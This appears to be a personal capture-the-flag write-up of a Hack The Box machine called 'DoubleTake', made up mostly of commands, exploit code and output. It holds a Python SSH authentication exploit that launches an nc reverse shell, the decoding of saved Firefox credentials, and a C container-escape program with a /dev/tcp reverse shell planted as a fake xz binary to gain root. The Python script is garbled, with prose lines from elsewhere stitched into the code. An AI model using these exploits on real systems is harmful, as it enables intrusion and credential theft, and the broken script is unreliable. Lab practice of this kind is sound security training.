---
title: DoubleTake
tag: OpenSSH,
---
![[Pasted image 20261114202115.png]]

```zsh
┌──(kali㉿kali)-[~/…/HTB/Linux/Easy/DoubleTake]
└─$ sudo nmap -Pn -p- -sS -oN open-port_scan.txt --open 10.129.150.179
[sudo] password for kali:
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-14 19:22 +0900
Nmap scan report for 10.129.150.179
Host is up (0.26s latency).
Not shown: 65492 closed tcp ports (reset), 41 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 75.87 seconds
```

![[Pasted image 20261114192652.png]]

```zsh
┌──(kali㉿kali)-[~/…/HTB/Linux/Easy/DoubleTake]
└─$ nmap -Pn -p22,80 -sVC 10.129.150.179
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-14 19:27 +0900
Nmap scan report for 10.129.150.179
Host is up (0.26s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.6 (protocol 2.0)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
|_http-server-header: nginx/1.24.0 (Ubuntu)
| http-auth:
| HTTP/1.1 401 UNAUTHORIZED\x0D
|_  Basic realm=Zentara
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.54 seconds
```

![[Pasted image 20261114192845.png]]

- OpennSSH 10.6
- nginx 1.24.0

```zsh
┌──(kali㉿kali)-[~/…/HTB/Linux/Easy/DoubleTake]
└─$ whatweb http://10.129.150.179
http://10.129.150.179 [401 Unauthorized] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], IP[10.129.150.179], WWW-Authenticate[Zentara][Basic], nginx[1.24.0]
```

![[Pasted image 20261114193013.png]]

![[Pasted image 20261114202159.png]]

Intercept

![[Pasted image 20261114202434.png]]

username:password -> base64 encode

バイパスできず

```python
#!/usr/bin/env python3
import paramiko
import sys
import time
host = sys.argv[1]
lhost = sys.argv[2]
lport = int(sys.argv[3]) if len(sys.argv) > 3 else 9001
pw = "A" * 300
t = paramiko.Transport((host, 22))
t.start_client(timeout=10)
for i in range(1, 7):
try:
t.auth_password("alpine", pw)
print(f"[+] attempt {i}: authenticated")
break
except paramiko.AuthenticationException:
print(f"[-] attempt {i}: denied")
if not t.is_authenticated():
print("[-] failed")
sys.exit(1)
rev = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f"
ch = t.open_session()
ch.exec_command(rev)
Start a listener, then fire the exploit:
Then we should receive a response.
Lateral Movement
Container Enumeration
The shell is inside a Docker container running Alpine :
The alpine user's home directory has a Firefox profile with a saved login:
The content of the logins.json has been formatted below for readability.
time.sleep(1)
t.close()
print("[+] sent")
```

```zsh
┌──(kali㉿kali)-[~/…/HTB/Linux/Easy/DoubleTake]
└─$ python3 poc.py 10.129.150.179 10.10.14.216 443
[-] attempt 1: denied
[+] attempt 2: authenticated
[+] sent
```

```zsh
┌──(kali㉿kali)-[~/…/HTB/Linux/Easy/DoubleTake]
└─$ rlwrap -cAr nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.216] from (UNKNOWN) [10.129.150.179] 38819
/bin/sh: can't access tty; job control turned off
~ $ id
uid=1000(alpine) gid=1000(alpine) groups=1000(alpine)
~ $ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0@if4: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue state UP 
    link/ether ce:a5:ba:df:4f:43 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever
~ $ 
```

```zsh
~/.mozilla/firefox/zentara.default $ cat logins.json
{"nextId":2,"logins":[{"id":1,"hostname":"http://172.17.0.1","httpRealm":"Zentara","formActionOrigin":null,"usernameField":"","passwordField":"","encryptedUsername":"Ym9i","encryptedPassword":"Q29ycmVjdEhvcnNlQmF0dGVyeVN0YXBsZQ==","guid":"{a1b2c3d4-e5f6-7890-abcd-ef1234567890}","encType":0,"timeCreated":1730000000000,"timeLastUsed":1730900000000,"timePasswordChanged":1730000000000,"timesUsed":14}],"potentiallyVulnerablePasswords":[],"dismissedBreachAlertsByLoginGUID":{},"version":3}
```

```zsh
┌──(kali㉿kali)-[~/…/HTB/Linux/Easy/DoubleTake]
└─$ cat logins.json|jq              
{
  "nextId": 2,
  "logins": [
    {
      "id": 1,
      "hostname": "http://172.17.0.1",
      "httpRealm": "Zentara",
      "formActionOrigin": null,
      "usernameField": "",
      "passwordField": "",
      "encryptedUsername": "Ym9i",
      "encryptedPassword": "Q29ycmVjdEhvcnNlQmF0dGVyeVN0YXBsZQ==",
      "guid": "{a1b2c3d4-e5f6-7890-abcd-ef1234567890}",
      "encType": 0,
      "timeCreated": 1730000000000,
      "timeLastUsed": 1730900000000,
      "timePasswordChanged": 1730000000000,
      "timesUsed": 14
    }
  ],
  "potentiallyVulnerablePasswords": [],
  "dismissedBreachAlertsByLoginGUID": {},
  "version": 3
}
```


```zsh
┌──(kali㉿kali)-[~/…/HTB/Linux/Easy/DoubleTake]
└─$ echo "Q29ycmVjdEhvcnNlQmF0dGVyeVN0YXBsZQ==" | base64 -d
CorrectHorseBatteryStaple                                                                                                                    
┌──(kali㉿kali)-[~/…/HTB/Linux/Easy/DoubleTake]
└─$ echo "Ym9i" | base64 -d                                
bob 
```

![[Pasted image 20261114204857.png]]

```zsh
┌──(kali㉿kali)-[~/…/HTB/Linux/Easy/DoubleTake]
└─$ ssh bob@10.129.150.179                     
The authenticity of host '10.129.150.179 (10.129.150.179)' can't be established.
ED25519 key fingerprint is: SHA256:u2EVHZXSTdAQE5JLXm4b4V9tOPC/AcVad5rvjvfDHNc
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.150.179' (ED25519) to the list of known hosts.
bob@10.129.150.179's password: 
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See <https://wiki.alpinelinux.org/>.

You can setup the system with the command: setup-alpine

You may change this message by editing /etc/motd.

7f906e0ee8ec:~$ id
uid=1001(bob) gid=1001(bob) groups=1001(bob)
7f906e0ee8ec:~$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0@if4: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue state UP 
    link/ether ce:a5:ba:df:4f:43 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever
```

http://10.129.150.179/?c=c8f2a1b0&agent=CodePilot

![[Pasted image 20261114210655.png]]

![[Pasted image 20261114210737.png]]

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mount.h>
int main(int argc, char *argv[]) {
        mount("proc", "/proc", "proc", 0, NULL);
        chroot("/proc/1/root");
        chdir("/");
        execl("/bin/bash", "bash", "-c", "bash -i >& /dev/tcp/10.10.14.216/4444 0>&1", NULL);
        return 1;
}
```

![[Pasted image 20261114211833.png]]

![[Pasted image 20261114211850.png]]

```zsh
┌──(kali㉿kali)-[~/…/HTB/Linux/Easy/DoubleTake]
└─$ gcc -static -o xz xz.c

┌──(kali㉿kali)-[~/…/HTB/Linux/Easy/DoubleTake]
└─$ mkdir -p pkg/usr/bin                                                  
┌──(kali㉿kali)-[~/…/HTB/Linux/Easy/DoubleTake]
└─$ cp xz pkg/usr/bin/xz

┌──(kali㉿kali)-[~/…/Linux/Easy/DoubleTake/pkg]
└─$ cd ../                                  

┌──(kali㉿kali)-[~/…/HTB/Linux/Easy/DoubleTake]
└─$ cd pkg && tar cf ../plant.tar usr/bin/xz

┌──(kali㉿kali)-[~/…/Linux/Easy/DoubleTake/pkg]
└─$ cd ../                
```

![[Pasted image 20261114211907.png]]

![[Pasted image 20261114211936.png]]

```zsh
┌──(kali㉿kali)-[~/…/HTB/Linux/Easy/DoubleTake]
└─$ curl -u bob:CorrectHorseBatteryStaple \
-F 'archive=@trigger.tar.xz' \
-F 'workspace=/workspace' \
 http://10.129.150.179/deploy
```

![[Pasted image 20261114213341.png]]

```zsh
┌──(kali㉿kali)-[~/…/HTB/Linux/Easy/DoubleTake]
└─$ rlwrap -cAr nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.216] from (UNKNOWN) [10.129.150.179] 43964
bash: cannot set terminal process group (1328): Inappropriate ioctl for device
bash: no job control in this shell
root@doubletake:/# id
id
uid=0(root) gid=0(root) groups=0(root)
root@doubletake:/#
```

![[Pasted image 20261114213447.png]]